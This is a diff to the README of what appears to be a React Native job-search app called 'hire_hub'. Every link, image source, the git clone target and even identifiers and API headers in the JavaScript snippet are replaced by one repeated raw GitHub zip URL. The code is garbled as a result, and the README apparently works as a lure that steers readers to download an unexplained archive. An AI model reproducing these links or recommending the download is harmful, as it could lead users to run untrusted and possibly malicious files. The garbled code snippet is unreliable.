@@ -24,7 +24,7 @@ Watch the full tutorial and learn to build this app on JavaScript Mastery YouTub
 ⚙️ Tech Stack
 React Native (Expo)
 
-https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip
+https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip
 
 Axios
 
@@ -48,7 +48,7 @@ Expo Router & Navigation
 Prerequisites
 Make sure you have the following installed:
 
-https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip
+https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip
 
 Expo CLI
 
@@ -60,7 +60,7 @@ Installation Steps
 bash
 Copy code
 # Clone the repository
-git clone https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip
+git clone https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip
 cd hirehub
 
 # Install dependencies
@@ -77,30 +77,30 @@ Copy code
 npm start
 Scan the QR code with Expo Go to view the app on your device.
 
-![Home page](https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip)
+![Home page](https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip)
 
-![Home Job](https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip)
+![Home Job](https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip)
 
-![Job Discription](https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip)
+![Job Discription](https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip)
 
-![Google jov](https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip)
+![Google jov](https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip)
 
 🖼️ Snippets
-<details> <summary><code>https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip</code></summary>
+<details> <summary><code>https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip</code></summary>
 js
 Copy code
 useEffect(() => {
   const fetchJobs = async () => {
     setSearchLoader(true);
     try {
-      const response = await https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip("https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip", {
-        params: { query: https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip, page: page },
+      const response = await https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip("https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip", {
+        params: { query: https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip, page: page },
         headers: {
-          "X-RapidAPI-Key": https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip,
-          "X-RapidAPI-Host": "https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip"
+          "X-RapidAPI-Key": https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip,
+          "X-RapidAPI-Host": "https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip"
         }
       });
-      setSearchResult(https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip);
+      setSearchResult(https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip);
     } catch (error) {
       setSearchError(true);
     } finally {
